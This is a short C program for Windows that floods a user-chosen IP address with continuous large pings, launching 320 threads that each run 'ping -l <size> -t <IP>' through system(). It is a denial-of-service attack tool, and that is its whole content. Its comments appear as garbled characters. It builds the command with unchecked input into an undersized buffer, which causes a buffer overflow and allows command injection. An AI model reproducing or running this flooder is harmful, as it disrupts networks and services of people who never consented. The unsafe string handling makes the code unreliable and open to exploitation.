#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <pthread.h>

char IP[30],data[30],ICMP[] = "ping -l ";

void *thread_1(void* a){
	system(ICMP);  //�̰��i�H65500�줸��   
} 
	 
int main(){ 
	pthread_t th;
	printf("��J�ؼ�IP : ");
	scanf("%s",IP);
	printf("��J�ʥ]�j�p : ");
	scanf("%s",data);
	strcat(ICMP,data);
	strcat(ICMP," -t ");
	strcat(ICMP,IP);
	for(int pl=0;pl<320;pl++){         //�@���}��320�u�{ 
        pthread_create(&th, NULL, thread_1, (void *)NULL); 
        Sleep(30);                     //���C������(�C0.03��W�[1�u�{) 
    }
        while(1){}                     //�����{�������(���i�]�t�Ыذ����) 
	    return 0;
	} 
